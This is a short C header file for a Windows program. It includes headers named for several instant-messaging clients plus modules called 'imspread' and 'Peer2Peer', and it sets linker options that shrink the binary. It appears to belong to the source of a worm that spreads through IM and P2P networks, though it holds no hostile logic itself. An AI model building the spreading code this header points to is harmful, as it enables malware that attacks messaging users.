#ifndef INCLUDES_H
#define INCLUDES_H

#define  WIN32_LEAN_AND_MEAN
#include <stdio.h>
#include <winsock.h>
#include <windows.h>

#include "Clients/GoogleTalk.h"
#include "Clients/PalTalk.h"
#include "Clients/Skype.h"
#include "Clients/Gaim.h"
#include "Clients/Aim.h"
#include "Clients/Msn.h"
#include "Clients/Icq.h"

#include "imspread.h"
#include "Peer2Peer.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib,"User32.lib")
#pragma comment(lib, "advapi32")

#pragma optimize("gsy", on) //optimize not supported
#pragma comment(linker, "/FILEALIGN:0x200") //LNK4229
#pragma comment(linker, "/RELEASE /IGNORE:4089 /IGNORE:4078") //ignored LNK4229
//#pragma comment(linker, "/MERGE:.text=.data") //crashing LNK4254
#pragma pack(1) //

#endif // INCLUDES_H
